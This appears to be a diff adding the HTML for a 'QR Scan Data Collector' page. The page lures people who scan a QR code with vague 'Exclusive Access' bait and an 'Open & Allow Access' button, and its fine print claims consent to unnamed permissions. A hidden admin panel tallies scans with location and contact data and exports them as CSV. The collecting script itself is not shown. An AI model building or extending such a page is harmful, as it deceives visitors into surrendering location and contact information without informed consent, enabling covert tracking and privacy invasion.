@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QR Scan Data Collector</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Main Scan Landing Page -->
+    <div id="scanLanding" class="scan-landing">
+        <div class="landing-container">
+            <div class="header-section">
+                <h1>🎉 Exclusive Access!</h1>
+                <p class="subtitle">You've discovered something special</p>
+            </div>
+            
+            <div class="content-preview">
+                <div class="preview-box">
+                    <h3>🎁 Special Content Awaits</h3>
+                    <p>Click below to unlock exclusive content, offers, or information!</p>
+                    <div class="features-list">
+                        <div class="feature-item">✨ Instant Access</div>
+                        <div class="feature-item">🔒 Secure & Private</div>
+                        <div class="feature-item">📱 Mobile Optimized</div>
+                    </div>
+                </div>
+                
+                <button id="openBtn" class="open-btn">
+                    <span class="btn-text">🚀 Open & Allow Access</span>
+                    <span class="btn-subtext">Tap to continue</span>
+                </button>
+            </div>
+
+            <div class="footer-info">
+                <small>By tapping "Open & Allow Access", you agree to provide necessary permissions for the best experience.</small>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen" style="display: none;">
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <h2>Accessing Content...</h2>
+            <p id="loadingText">Preparing your experience</p>
+        </div>
+    </div>
+
+    <!-- Admin Panel (Hidden) -->
+    <div id="adminPanel" class="admin-panel" style="display: none;">
+        <div class="admin-container">
+            <h2>Admin Panel - Scan Data</h2>
+            <div class="admin-controls">
+                <button id="downloadCSVBtn" class="admin-btn">Download CSV Data</button>
+                <button id="viewDataBtn" class="admin-btn">View Raw Data</button>
+                <button id="clearDataBtn" class="admin-btn warning">Clear All Data</button>
+                <button id="closeAdminBtn" class="admin-btn secondary">Close Admin</button>
+            </div>
+            
+            <div class="data-stats">
+                <div class="stat-item">
+                    <span class="stat-label">Total Scans:</span>
+                    <span id="totalScans" class="stat-value">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">With Location:</span>
+                    <span id="locationScans" class="stat-value">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">With Contact:</span>
+                    <span id="contactScans" class="stat-value">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Last Scan:</span>
+                    <span id="lastScan" class="stat-value">Never</span>
+                </div>
+            </div>
+            
+            <div id="rawDataDisplay" class="raw-data" style="display: none;">
+                <h3>Raw Scan Data</h3>
+                <textarea id="rawDataText" readonly></textarea>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
